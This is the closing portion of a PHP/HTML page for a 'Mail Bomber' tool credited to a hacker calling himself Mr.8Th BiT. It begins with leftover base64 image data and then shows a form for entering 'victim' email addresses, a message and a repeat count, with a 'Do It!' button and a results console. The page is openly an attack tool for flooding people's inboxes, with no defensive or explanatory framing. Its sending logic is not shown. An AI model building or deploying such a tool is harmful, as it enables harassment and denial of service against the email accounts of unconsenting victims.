6H+FH/CUfD7/AKEiz/76H+FeN+a/940ea/8AeNAXPaIPGPgSzuI7m38GWsc0bB0dXGVI5BHFcJ8QvE8XivxFNqUULQrIqrsZtx4GOtcl5r/3jTSSeppg2J3r0r4eeOLHwzYalZ3tgbyG+VUdN4UYGcg8HOc15rShmXoaATseznxV4Ac5bwTZk/74/wAKT/hKPh//ANCRZ/8AfQ/wrxvzX/vGjzX/ALxpWG5X3PZP+Eo+H/8A0JFn/wB9D/Cj/hKPh9/0JFn/AN9D/CvG/Nf+8aPNf+8aBXPZP+Eo+H3/AEJNn/30P8Kz/Gfj7SdV8JQaDpelfYYIZvNRVcFR1yAMepzXlfmv/eNIXY9SaAuIxyxNJRRTEFOQ4cGm0UAe3+G/iJ4YHgWw8Pa3p010tuWLKVUox3MQevo1SHX/AIWE8+Fk/wC/S/8AxVeHB2HQml81/wC8aViuZ2se533xF8Iaf4T1XSND0qW1F7CybUVVXcRjJ5rwyVt0hNIXY9SabTE3cKKKKBBU9tcvbSh0Ygg5GKgooA9l8O/GaZNOGm+IbOPVrXG3MpG/HvkEN+PPvWg3iX4WTsZH8LIGPJAgT+jV4WCR0NO81x/EaViuZnuP9vfCr/oWF/78L/8AFUf298Kv+hYX/vyv/wAVXh3mv/eNHmv/AHjQFz3E6/8ACoc/8Iuv/flf/iqjvvi/p+j6e9l4S0W301WBHmhVB+oVRjPuSa8S81/7xppYnqaYrl/VdWudVvJbm6meWWRizu5yWNZ9FFAgooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKAFPOSOn0pKVuv4ChuGI96AEooooAKKKKACiiigAopcfKD70lABRRRQAUUUUAFFFFABRShiOhNFAH//Z" />
    </header>
	<nav>
    <center>
        <a href="<?php echo($_SERVER['PHP_SELF']); ?>" > Mail Bomber </a> 
        <a href="http://madleets.com/" target="_blank"> Madleets Official </a>
   		<a href="https://www.facebook.com/madleets.nameless" target="_blank">8Th BiT Official</a>
    </center>
   </nav>
   <section>
   		<article>
        	<section> 
            	<form id="ajaxform" >
            		<table>
                    	<tr>
							<td>
                            	Victim(s)
                            </td>
                            <td>
                               	<textarea style=""  name="victims" id="victims" placeholder="Info@Example.com" rows="5" ></textarea>
	                        </td>
                        </tr>
                        <tr>
                       		<td>
                            	Your Message
                            </td>
                            <td>
                            	<textarea name="message" id="message" rows="5" ></textarea>
                            </td>
                            <td>
                            	Use Random Numbers
                            </td>
                            <td>
                            	<input type="checkbox" checked="checked" name="rnm" id="rnm" />
                            </td>                            
                        </tr>
                       	<tr>
                        	<td>
                            	Count 
                            </td>
                            <td>
                            	<input value="0" type="number" name="count" id="count" />
                            </td>
                        </tr>
                        <tr>
                        	<td></td>
                            <td><input type="submit" id="submit" value="Do It! " /></td>
                        </tr>
                    </table>
    	        </form>
            </section>
        </article>
		<br />
        <span> Console : <a href="#" id="clear"> Clear </a> </span>
        <article>
        	<section>
                <div id="console">
                	
                </div>
            </section>
        </article>
   </section>
   <footer>
   		<center><span>Script Coded By Mr.8Th BiT <br /> Thanks To : <strong> Sniffer , MadCode , Sizziling Leet , infinityl33ts , 1337 , н4χ0яℓ1ƒ3 And All Iranian And Pakistan Coders And Hackers
       </strong> </span></center>
   </footer>
</div>
<?php endif;?>
</body>
</html>